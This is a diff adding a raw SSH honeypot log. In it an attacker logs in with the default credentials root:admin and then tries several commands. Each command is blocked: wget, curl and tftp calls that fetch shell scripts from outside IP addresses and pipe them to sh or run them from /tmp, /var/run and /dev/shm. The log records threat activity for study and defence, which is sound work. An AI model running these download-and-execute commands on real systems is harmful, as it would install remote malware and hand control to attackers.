@@ -1,0 +1,32 @@
+20170402_173031_160232 - [POT  ] network1 - 192.168.5.2:22
+20170402_173031_160232 - [SSH  ] Incoming Connection from 216.51.240.38:51547 - United States
+20170402_173031_480106 - [SSH  ] Login Successful: root:admin
+20170402_173031_480106 - [SSH  ] Login was spoofed
+20170402_173032_119515 - [EXEC44] Opened Channel
+20170402_173032_202510 - [EXEC44] Command Blocked: wget -qO - http://54.186.181.14/x/1sh | sh > /dev/null 2>&1 &
+20170402_173032_351873 - [EXEC44] Closed Channel
+20170402_173032_679196 - [EXEC45] Opened Channel
+20170402_173032_764389 - [EXEC45] Command Blocked: rm -rf /var/run/1sh; wget -c http://54.186.181.14/x/1sh -P /var/run && sh /var/run/1sh &
+20170402_173033_082049 - [EXEC45] Closed Channel
+20170402_173033_275110 - [EXEC46] Opened Channel
+20170402_173033_353425 - [EXEC46] Command Blocked: wget -qO - http://54.186.181.14/x/2sh | sh > /dev/null 2>&1 &
+20170402_173033_505936 - [EXEC46] Closed Channel
+20170402_173033_692164 - [EXEC47] Opened Channel
+20170402_173033_780229 - [EXEC47] Command Blocked: rm -rf /tmp/2sh; wget -c http://54.186.181.14/x/2sh -P /tmp && sh /tmp/2sh &
+20170402_173034_113837 - [EXEC47] Closed Channel
+20170402_173034_301423 - [EXEC48] Opened Channel
+20170402_173034_379380 - [EXEC48] Command Blocked: curl http://54.186.181.14/x/3sh | sh
+20170402_173034_445603 - [EXEC48] Closed Channel
+20170402_173034_623752 - [EXEC49] Opened Channel
+20170402_173034_704618 - [EXEC49] Command Blocked: cd /var/run ; rm -rf tsh ; tftp -g 49.231.211.209 -r tsh ; sh tsh &
+20170402_173034_773301 - [EXEC49] Closed Channel
+20170402_173035_020711 - [EXEC50] Opened Channel
+20170402_173035_105589 - [EXEC50] Command Blocked: cd /tmp ; rm -rf tsh ; tftp -g 49.231.211.209 -r tsh ; sh tsh &
+20170402_173035_182921 - [EXEC50] Closed Channel
+20170402_173035_360383 - [EXEC51] Opened Channel
+20170402_173035_442503 - [EXEC51] Command Blocked: cd /dev/shm ; rm -rf tsh ; tftp -g 49.231.211.209 -r tsh ; sh tsh &
+20170402_173035_514071 - [EXEC51] Closed Channel
+20170402_173035_701501 - [EXEC52] Opened Channel
+20170402_173035_779381 - [EXEC52] Command Blocked: uname -a || echo - 
+20170402_173035_847092 - [EXEC52] Closed Channel
+20170402_173048_923153 - [SSH  ] Lost Connection with 216.51.240.38
